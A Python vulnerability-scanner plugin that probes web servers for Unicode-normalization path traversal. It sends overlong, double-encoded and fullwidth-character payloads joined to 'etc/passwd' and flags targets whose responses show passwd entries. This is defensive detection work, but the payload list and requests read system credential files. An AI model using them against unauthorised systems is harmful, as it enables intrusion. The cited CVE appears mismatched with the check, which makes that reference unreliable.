import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class UnicodeNormalizationBypass(NaslPlugin):
    PLUGIN_ID = 1291
    NAME = "Unicode Normalization Bypass Detection"
    FAMILY = "Web Application Security"
    CVSS_SCORE = 7.5
    DESCRIPTION = "Detects Unicode normalization vulnerabilities that allow bypassing input validation via homoglyph characters, alternate encodings, or normalization inconsistencies."
    SOLUTION = "Apply consistent Unicode normalization (NFC recommended) to all user input. Use allowlist-based validation after normalization. Implement proper encoding detection."
    CVE = ["CVE-2024-2961"]
    PORTS = [80, 443, 8080, 8443]

    UNICODE_PAYLOADS = [
        ("%C0%AE%C0%AE/", "overlong path traversal"),
        ("%252e%252e%252f", "double encoded traversal"),
        ("\u2024\u2024/", "unicode dot leader"),
        ("\uff0f", "fullwidth solidus"),
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = "https" if port_to_check in (443, 8443) else "http"
                ctx = None
                if scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = target
                if target in ("127.0.0.1", "localhost", "::1"):
                    host_header = "alieninc.tech"
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                )
                for payload, ptype in self.UNICODE_PAYLOADS:
                    request = (
                        f"GET /{payload}etc/passwd HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
                        if b"\r\n\r\n" in response:
                            headers, _, body = response.partition(b"\r\n\r\n")
                            cl_match = __import__("re").search(rb"Content-Length:\s*(\d+)", headers, __import__("re").I)
                            if cl_match:
                                content_length = int(cl_match.group(1))
                                if len(body) >= content_length:
                                    break
                            else:
                                break
                    decoded = response.decode("utf-8", errors="replace")
                    body_text = decoded.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded else ""
                    if "root:" in body_text and "nobody:" in body_text:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port_to_check,
                            cvss_score=self.CVSS_SCORE,
                            severity="high",
                            description=self.DESCRIPTION,
                            solution=self.SOLUTION,
                            evidence=f"Unicode normalization bypass successful using {ptype}: {payload}",
                            references=self.CVE
                        ))
                        break
                if not any(r.vulnerable for r in results):
                    request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                continue
            finally:
                if 'writer' in locals() and writer:
                    writer.close()
                    await writer.wait_closed()
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description="No unicode normalization bypass detected"))
        return results
